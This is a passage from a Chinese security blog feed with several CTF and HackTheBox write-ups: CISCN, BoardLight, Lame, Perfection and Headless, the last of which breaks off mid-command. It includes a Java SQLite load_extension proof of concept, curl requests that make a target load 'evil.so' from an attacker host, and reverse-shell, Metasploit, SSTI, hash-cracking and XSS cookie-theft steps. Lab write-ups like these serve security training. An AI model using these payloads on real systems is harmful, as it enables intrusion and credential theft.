class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.jdbctest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.PreparedStatement;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Filedb</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">dbFile</span> <span class="operator">=</span> <span class="string">&quot;E:/poc.db&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(dbFile);</span><br><span class="line">            Class.forName(<span class="string">&quot;org.sqlite.JDBC&quot;</span>);</span><br><span class="line">            <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(<span class="string">&quot;jdbc:sqlite:&quot;</span>+dbFile);</span><br><span class="line">            System.out.println(<span class="string">&quot;Opened database successfully&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;CREATE VIEW security as SELECT ( SELECT load_extension(&#x27;/tmp/sqlite-jdbc-tmp-*.db&#x27;));&quot;</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="type">PreparedStatement</span> <span class="variable">preStmt</span> <span class="operator">=</span> conn.prepareStatement(sql);</span><br><span class="line"></span><br><span class="line">            preStmt.executeUpdate();</span><br><span class="line">            preStmt.close();</span><br><span class="line">            conn.close();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>开启监听，curl发包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl --header &quot;Content-Type: application/json&quot;  --request POST  --data &#x27;&#123;&quot;type&quot;: 3,&quot;url&quot;: &quot;jdbc:sqlite::resource:http://ip/evil.so&quot;&#125;&#x27; http://ip/jdbc/connect</span><br><span class="line"></span><br><span class="line"> curl --header &quot;Content-Type: application/json&quot;  --request POST  --data &#x27;&#123;&quot;type&quot;: 3,&quot;url&quot;: &quot;jdbc:sqlite::resource:http://ip/poc.db&quot;,&quot;tableName&quot;: &quot;security&quot;&#125;&#x27; http://ip/jdbc/connect</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CISCN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB BoardLight</title>
      <link href="/2024/05/22/writeup/htb/HTB%20BoardLight/"/>
      <url>/2024/05/22/writeup/htb/HTB%20BoardLight/</url>
      
        <content type="html"><![CDATA[<h1 id="BoardLight-Linux-·-Easy"><a href="#BoardLight-Linux-·-Easy" class="headerlink" title="BoardLight (Linux · Easy)"></a>BoardLight (Linux · Easy)</h1><p>CVE-2023-30253 + CVE-2022-37706</p><h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -Pn -v -T4 10.10.11.11</span><br><span class="line"></span><br><span class="line">Nmap scan report for board.htb (10.10.11.11)</span><br><span class="line">Host is up (0.29s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)</span><br><span class="line">|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)</span><br><span class="line">|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kerne</span><br></pre></td></tr></table></figure><p>添加hosts</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;10.10.11.11 board.htb&quot; | sudo tee -a /etc/hosts</span><br></pre></td></tr></table></figure><h3 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster vhost -u http://board.htb --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240726151133860.png" alt="image-20240726151133860"></p><p>添加hosts</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;10.10.11.11 crm.board.htb&quot; | sudo tee -a /etc/hosts</span><br></pre></td></tr></table></figure><h3 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://board.htb</span><br><span class="line">Nothing</span><br><span class="line">dirsearch -u http://crm.board.htb</span><br></pre></td></tr></table></figure><p>board.htb</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240726150114693.png" alt="image-20240726150114693"></p><p>crm.board.htb</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240726145955767.png" alt="image-20240726145955767"></p><p>弱口令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin:admin</span><br></pre></td></tr></table></figure><p>google search</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240726151435132.png" alt="image-20240726151435132"></p><p>利用 CVE-2023-30253 反弹shell</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240726152315280.png" alt="image-20240726152315280"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/www/html/crm.board.htb/htdocs/conf/conf.php</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240726154346600.png" alt="image-20240726154346600"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dolibarr_main_db_user=&#x27;dolibarrowner&#x27;;</span><br><span class="line">$dolibarr_main_db_pass=&#x27;serverfun2$2023!!&#x27;;</span><br></pre></td></tr></table></figure><p>数据库里基本都是关于网站的信息，猜测密码重用，查下有bash权限的用户，连ssh</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240726160304373.png" alt="image-20240726160304373"></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240726154219262.png" alt="image-20240726154219262"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240726160553270.png" alt="image-20240726160553270"></p><p>enlightenment，查看下版本</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240726163516682.png" alt="image-20240726163516682"></p><p>google search</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240726163958750.png" alt="image-20240726163958750"></p><p>scp 传过去</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp exploit.sh larissa@board.htb:/tmp</span><br></pre></td></tr></table></figure><p>赋权执行</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240726164219359.png" alt="image-20240726164219359"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB Lame</title>
      <link href="/2024/05/20/writeup/htb/HTB%20Lame/"/>
      <url>/2024/05/20/writeup/htb/HTB%20Lame/</url>
      
        <content type="html"><![CDATA[<h1 id="Lame-Linux-·-Easy"><a href="#Lame-Linux-·-Easy" class="headerlink" title="Lame (Linux · Easy)"></a>Lame (Linux · Easy)</h1><p>SMB</p><h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -v -p- -T4 -Pn 10.10.10.3</span><br><span class="line"></span><br><span class="line">Nmap scan report for bogon (10.10.10.3)</span><br><span class="line">Host is up (0.32s latency).</span><br><span class="line">Not shown: 65530 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">21/tcp   open  ftp         vsftpd 2.3.4</span><br><span class="line">|_ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to 10.10.16.38</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      vsFTPd 2.3.4 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)</span><br><span class="line">|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)</span><br><span class="line">3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Unix (Samba 3.0.20-Debian)</span><br><span class="line">|   Computer name: lame</span><br><span class="line">|   NetBIOS computer name: </span><br><span class="line">|   Domain name: hackthebox.gr</span><br><span class="line">|   FQDN: lame.hackthebox.gr</span><br><span class="line">|_  System time: 2024-07-29T02:32:28-04:00</span><br><span class="line">|_clock-skew: mean: 1h51m54s, deviation: 2h49m45s, median: -8m07s</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>21端口，ftp默认凭据<code>anonymous:anonymous</code>，版本信息(vsFTPD 2.3.4)，找到CVE-2011-2523，测试失败</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240729144704013.png" alt="image-20240729144704013"></p><p>445端口，SMB，版本信息(lame server (Samba 3.0.20-Debian))</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240729145453133.png" alt="image-20240729145453133"></p><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>打SMB</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240729151016637.png" alt="image-20240729151016637"></p><p>设置好参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br><span class="line">set rhosts 10.10.10.3</span><br><span class="line">set lhost 10.10.16.38</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240729151825285.png" alt="image-20240729151825285"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB Perfection</title>
      <link href="/2024/05/12/writeup/htb/HTB%20Perfection/"/>
      <url>/2024/05/12/writeup/htb/HTB%20Perfection/</url>
      
        <content type="html"><![CDATA[<h1 id="Perfection-Linux-·-Easy"><a href="#Perfection-Linux-·-Easy" class="headerlink" title="Perfection (Linux · Easy)"></a>Perfection (Linux · Easy)</h1><p>RubySSTI+hashcat</p><h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -sT -T4 10.10.11.253</span><br><span class="line"></span><br><span class="line">Nmap scan report for 10.10.11.253 (10.10.11.253)</span><br><span class="line">Host is up (0.26s latency).</span><br><span class="line">Not shown: 984 closed tcp ports (conn-refused)</span><br><span class="line">PORT      STATE    SERVICE        VERSION</span><br><span class="line">6/tcp     filtered unknown</span><br><span class="line">22/tcp    open     ssh            OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)</span><br><span class="line">|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)</span><br><span class="line">33/tcp    filtered dsp</span><br><span class="line">80/tcp    open     http           nginx</span><br><span class="line">|_http-title: Weighted Grade Calculator</span><br><span class="line">1010/tcp  filtered surf</span><br><span class="line">1151/tcp  filtered unizensus</span><br><span class="line">1277/tcp  filtered miva-mqs</span><br><span class="line">1352/tcp  filtered lotusnotes</span><br><span class="line">3221/tcp  filtered xnm-clear-text</span><br><span class="line">5431/tcp  filtered park-agent</span><br><span class="line">6129/tcp  filtered unknown</span><br><span class="line">6566/tcp  filtered sane-port</span><br><span class="line">6792/tcp  filtered unknown</span><br><span class="line">10616/tcp filtered unknown</span><br><span class="line">10629/tcp filtered unknown</span><br><span class="line">41511/tcp filtered unknown</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h3><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240429203253429.png" alt="image-20240429203253429"></p><p>网页底部，提供了相关信息，Ruby Web</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240430134229759.png" alt="image-20240430134229759"></p><p>&#x2F;weighted-grade，在此测试</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240430134406811.png" alt="image-20240430134406811"></p><p>恶意输入被阻止，fuzz</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240430140345271.png" alt="image-20240430140345271"></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240430140505438.png" alt="image-20240430140505438"></p><p>SSTI测试，<a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby</a></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240430140704412.png" alt="image-20240430140704412"></p><h2 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h2><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240430141704261.png" alt="image-20240430141704261"></p><p>反弹shell</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240430142218162.png" alt="image-20240430142218162"></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240430142333239.png" alt="image-20240430142333239"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>sudo suid 没什么好利用的</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240430142930032.png" alt="image-20240430142930032"></p><p>下载PEASS-ng进行提权分析</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240430143443896.png" alt="image-20240430143443896"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x linpeas.sh</span><br><span class="line">./linpeas.sh</span><br></pre></td></tr></table></figure><p>Files with Interesting Permissions</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240430144613273.png" alt="image-20240430144613273"></p><p>&#x2F;var&#x2F;mail&#x2F;susan</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240430144855377.png" alt="image-20240430144855377"></p><p>译：由于学生路径数据泄露，我们将过渡到木星年级，我认为我们也应该迁移我们的证书（包括其他学生在我们班上）到新平台。我还建议制定一个新的密码规范，让每个人都能更轻松地使用。密码格式为：<br><code>&#123;firstname&#125;_｛名字倒过来｝_｛随机生成的1到1000000000之间的整数&#125;</code><br>请注意，名字的所有字母都应该转换成小写字母。请尽可能向我提供有关迁移的最新信息。我目前正在该平台上注册我们的大学。<br>-Tina，你可爱的学生</p><p>&#x2F;home&#x2F;susan&#x2F;Migration&#x2F;pupilpath_credentials.db</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240430145154409.png" alt="image-20240430145154409"></p><p>显示不全，传过来用sqlite工具打开</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240430145853820.png" alt="image-20240430145853820"></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240430150010098.png" alt="image-20240430150010098"></p><h3 id="hash-identifier"><a href="#hash-identifier" class="headerlink" title="hash-identifier"></a>hash-identifier</h3><p>识别哈希加密类型</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240430150306305.png" alt="image-20240430150306305"></p><h3 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 3 -m 1400 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f  &quot;susan_nasus_?d?d?d?d?d?d?d?d?d&quot;</span><br></pre></td></tr></table></figure><p>-m 1400 是 sha-256</p><p>-a 3 是掩码攻击，知道密码是9位长，设定一个掩码<code>?d?d?d?d?d?d?d?d?d</code> (字母l，任意a)</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240430150758897.png" alt="image-20240430150758897"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh susan@10.10.11.253</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240430151550277.png" alt="image-20240430151550277"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB Headless</title>
      <link href="/2024/05/10/writeup/htb/HTB%20Headless/"/>
      <url>/2024/05/10/writeup/htb/HTB%20Headless/</url>
      
        <content type="html"><![CDATA[<h1 id="Headless-Linux-·-Easy"><a href="#Headless-Linux-·-Easy" class="headerlink" title="Headless (Linux · Easy)"></a>Headless (Linux · Easy)</h1><p>XSS+SUID提权</p><h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sT -sV - 10.10.11.8</span><br><span class="line"></span><br><span class="line">Nmap scan report for 10.10.11.8 (10.10.11.8)</span><br><span class="line">Host is up (0.23s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)</span><br><span class="line">|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)</span><br><span class="line">5000/tcp open  upnp?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.1 200 OK</span><br><span class="line">|     Server: Werkzeug/2.2.2 Python/3.11.2</span><br><span class="line">|     Date: Sun, 28 Apr 2024 07:24:48 GMT</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Content-Length: 2799</span><br><span class="line">|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/</span><br><span class="line">|     Connection: close</span><br><span class="line">|     &lt;!DOCTYPE html&gt;</span><br><span class="line">|     &lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">|     &lt;title&gt;Under Construction&lt;/title&gt;</span><br><span class="line">|     &lt;style&gt;</span><br><span class="line">|     body &#123;</span><br><span class="line">|     font-family: &#x27;Arial&#x27;, sans-serif;</span><br><span class="line">|     background-color: #f7f7f7;</span><br><span class="line">|     margin: 0;</span><br><span class="line">|     padding: 0;</span><br><span class="line">|     display: flex;</span><br><span class="line">|     justify-content: center;</span><br><span class="line">|     align-items: center;</span><br><span class="line">|     height: 100vh;</span><br><span class="line">|     .container &#123;</span><br><span class="line">|     text-align: center;</span><br><span class="line">|     background-color: #fff;</span><br><span class="line">|     border-radius: 10px;</span><br><span class="line">|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);</span><br><span class="line">|   RTSPRequest: </span><br><span class="line">|     &lt;!DOCTYPE HTML&gt;</span><br><span class="line">|     &lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">|     &lt;title&gt;Error response&lt;/title&gt;</span><br><span class="line">|     &lt;/head&gt;</span><br><span class="line">|     &lt;body&gt;</span><br><span class="line">|     &lt;h1&gt;Error response&lt;/h1&gt;</span><br><span class="line">|     &lt;p&gt;Error code: 400&lt;/p&gt;</span><br><span class="line">|     &lt;p&gt;Message: Bad request version (&#x27;RTSP/1.0&#x27;).&lt;/p&gt;</span><br><span class="line">|     &lt;p&gt;Error code explanation: 400 - Bad request syntax or unsupported method.&lt;/p&gt;</span><br><span class="line">|     &lt;/body&gt;</span><br><span class="line">|_    &lt;/html&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="http://10.10.11.8:5000/">http://10.10.11.8:5000/</a></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240428182551382.png" alt="image-20240428182551382"></p><h3 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h3><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240428182842525.png" alt="image-20240428182842525"></p><p>&#x2F;support</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240428182942809.png" alt="image-20240428182942809"></p><p>&#x2F;dashboard</p><p>未经授权，猜测和用户权限有关</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240428183202226.png" alt="image-20240428183202226"></p><p>抓包看到 Cookie: is_admin，猜测用XSS窃取Cookie</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240428193956394.png" alt="image-20240428193956394"></p><p>测试多次，发现在User-Agent处可以利用</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240428194006931.png" alt="image-20240428194006931"></p><p>本机起一个http服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 